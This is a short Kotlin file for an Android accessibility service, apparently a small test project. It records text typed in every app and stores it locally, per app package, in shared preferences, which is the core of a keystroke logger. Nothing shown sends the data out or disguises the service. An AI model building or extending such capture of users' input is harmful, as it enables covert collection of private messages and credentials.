package com.yuvesh.accessibiltyservice1

import android.content.Context
import android.content.SharedPreferences
import android.view.accessibility.AccessibilityEvent
import android.accessibilityservice.AccessibilityService
import android.content.pm.PackageManager
import android.util.Log


class MyAccessibilityService : AccessibilityService() {

    private lateinit var sharedPrefs: SharedPreferences
    private var previousText: String? = null


    override fun onCreate() {
        super.onCreate()

        // Initialize shared preferences
        sharedPrefs = getSharedPreferences("packages", Context.MODE_PRIVATE)
    }
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Check if the event is a TYPE_VIEW_TEXT_CHANGED event
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            previousText = event.text[0].toString()
        }

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            previousText?.let {

                val currentValue = sharedPrefs.getString(event.packageName.toString(), "")
                val editor = sharedPrefs.edit()
                editor.putString(event.packageName.toString(), currentValue + '\n' + it)
                editor.apply()
            }
            previousText = null
        }
    }

    override fun onInterrupt() {}




    }

